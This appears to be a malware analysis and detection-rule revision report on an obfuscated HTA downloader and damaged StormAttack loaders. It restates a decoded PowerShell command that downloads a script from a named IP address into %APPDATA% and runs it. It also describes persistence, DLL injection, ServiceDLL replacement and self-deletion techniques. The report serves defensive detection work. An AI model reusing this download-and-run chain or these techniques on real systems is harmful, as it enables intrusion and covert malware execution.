method: Static reverse engineering and decoding; no sample was executed.
external_context: Collection and AV/sandbox reports supplied in the queue were treated as leads. The three linked Triage pages could not be opened with the web tool. Verdicts rest on sample bytes.

evidence: Reconstructs WScript.Shell using ChrW(&H77) and a string suffix; reconstructs %COMSPEC% with Chr/ChrW.
WScript.Shell.Run requests window style 0 for the command shell and the HTA then closes itself.

PowerShell options include abbreviated execution-policy bypass, no profile and a UTF-16LE Base64 encoded command. Its own -W 1 option means Normal; only the outer Run explicitly requests a hidden window.
Decoded command: wget from http://38.247.161.228/18/wethinkingsureforme.js with -Outfile "$env:APPDATA\wethinkingsureforme.js", followed by & of that same path.
Randomized identifier/keyword case and long whitespace runs conceal a downloader with no document or visible application function.
limits: Downloaded JavaScript content was not acquired. No downstream theft, ransomware or RAT family is established.

Execution depends on HTA/VBScript support, PowerShell argument parsing, network reachability and Windows script-handler associations. Static review establishes the launch request and decoded instructions, not successful execution.
samples.marker_line: HTA stager: concealed download/run; corrected execution traits

samples.identification: Damaged StormAttack native loader with zeroed resources
evidence: CRT entry 0x402674 calls WinMain at 0x401cb0; configuration dword at 0x404120 selects mode 3.

Selected branch calls 0x401900: generates a GUID, prepares a Windows-directory EXE path, creates HKLM Active Setup Installed Components GUID/StubPath, reads its own image, patches/writes a copy and requests launch.
0x401390 obtains its module path and short path, reads COMSPEC, constructs /c del <self> > nul and calls CreateProcessA. Selected mode 3 calls this routine.

Dormant 0x401150 launches an IE/notepad/calc target selected by configuration, allocates and writes the DLL path remotely, resolves kernel32!LoadLibraryA and passes that pointer and path to CreateRemoteThread. This is DLL injection code, not process hollowing.
Dormant 0x401260 deletes and rewrites LanmanServer Parameters/ServiceDLL as REG_EXPAND_SZ; WinMain also contains a separate ServiceDLL query.
Resource extraction at 0x402460 requests type DLL, resource 101 and writes its bytes. StormServer.dll and the paired Storm DDoS banners corroborate identity alongside this code.
limits: Entire .rsrc is zero; no embedded DLL payload remains to analyze or execute.

The self-copy routine patches raw offsets 0x6a0 and 0x3058, while this artifact has mode configuration at file offset 0x4120. Its layout and bound-looking IAT values are consistent with a modified/dumped image; successful persistence and injection are unproven.

No operational DDoS loop, WannaCry encryption, or Remcos payload is demonstrated. No authorized research or deployment context was supplied. The surviving persistence/injection/self-removal implementation tips the likely-malicious judgment despite damage.
samples.marker_line: StormAttack: persistence, injection, self-delete code; traits fixed

samples.identification: Modified StormAttack loader with padded self-delete detour and damaged embedded DLL
evidence: Shares the first native sample's loader implementation and mode-3 persistence/self-copy selection.
Its .text differs at 0x401f8f: a call to self-delete is replaced by a jump to 0x40f000.

The added RWX .htext section calls 0x401390, executes canceling byte-register INC/DEC pairs, self-moves and self-exchanges, then jumps to 0x401f94. This is redundant-instruction obfuscation around the original cleanup.
Resource DLL/101/2052 points at RVA/file offset 0x5060, length 0x9c00. The embedded DLL has Storm DNS/command-format strings, but its last nonzero byte is at relative 0xf9f.
limits: Embedded DLL entry RVA 0x741a maps to zeroed file offset 0x681a. Declared import/export tables are also zeroed, and none of its sections are executable. This does not establish a functioning DDoS payload.
Same raw-offset self-copy mismatch and unknown runtime context as the first native sample. No Remcos or WannaCry behavior is established; the collector filename is not identity evidence.

trait_changes.intent: Hidden/encoded PowerShell options alone are suspicious. Hostile payload coverage additionally requires decoded download/output/dispatch observations and concealment. The existing hidden-downloader evasion composite now accepts that admitted payload chain.
trait_changes.deduplication: Removed the redundant concealed-powershell-appdata-script-actions composite from the interpreter subtree; its alternate concealment path is now handled by the file-execution composite.
trait_changes.native: ServiceDLL replacement identity now additionally requires a generalizable instruction fingerprint, with wildcarded pointers and both short/long stack displacements. Corrected a comment that incorrectly asserted the loader only queries ServiceDLL.
relocations: Same matcher and effective scope; numeric-to-character direction and no required arithmetic.
Same matcher/scope; at least three calls, not byte-string charset conversion.

Same matcher/scope; notable header build entries, not a resource or verified compiler identity.

trait_changes.char_code_partition: Flattened all 12 prior decimal-triplet/escape-sequence rules into the character-code operation leaf to accommodate direct codepoint conversions without a new overlapping child. Preserved all matchers, defaults, criticalities and scopes. Exact references moved; the sole escape-sequence directory selector was expanded to its original nine members rather than broadened to the whole new leaf.
placement_review: Claim-first review: numeric character construction, command options, interpreter command dispatch, header entries and section entropy each have distinct supported subjects.

Alternative-home review: character construction is not charset byte decoding or character-code encoding; command dispatch is not eval; section entropy is not resource validity. The 12 pre-existing character-code rules keep their discriminating names without needing a child for every representation.

validation.note: The native near misses change only the replacement-call buffer-size immediate from 128 to 127; the tightened replacement finding disappears while the remaining malicious-code observations persist.
